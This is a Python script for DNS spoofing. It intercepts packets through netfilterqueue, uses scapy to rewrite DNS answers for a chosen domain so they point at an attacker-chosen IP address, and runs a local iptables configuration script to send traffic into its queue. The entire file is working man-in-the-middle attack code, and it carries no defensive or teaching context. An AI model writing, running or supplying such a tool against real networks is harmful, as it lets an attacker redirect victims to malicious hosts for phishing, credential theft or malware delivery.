# !/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import os
import stat
import argparse


def get_range():
    parser = argparse.ArgumentParser()

    parser.add_argument("-s", "--ip", dest="ip", help="use this to set the system ip")
    parser.add_argument("-d", "--domain", dest="domain", help="use this to set the domain url")
    options = parser.parse_args()

    if not options.ip:
        parser.error("[-] Please specify the system's IP, use --help for more info")
    elif not options.domain:
        parser.error("[-] Please specify the domain url, use --help for more info")

    return options


def process_packet(packet):
    domain = get_range().domain
    ip_range = get_range().ip
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())

        q_name = scapy_packet[scapy.DNSQR].qname
        if domain in q_name:
            print("[+] Spoofing target ")
            answer = scapy.DNSRR(rrname=q_name, rdata=ip_range)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


# This automatically compiles and executes the shell script,
# Don't alter these lines below unless you are aware of what's happening

st = os.stat('iptables_config.sh')
os.chmod('iptables_config.sh', st.st_mode | stat.S_IEXEC)
subprocess.call(['sh', './iptables_config.sh'])

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
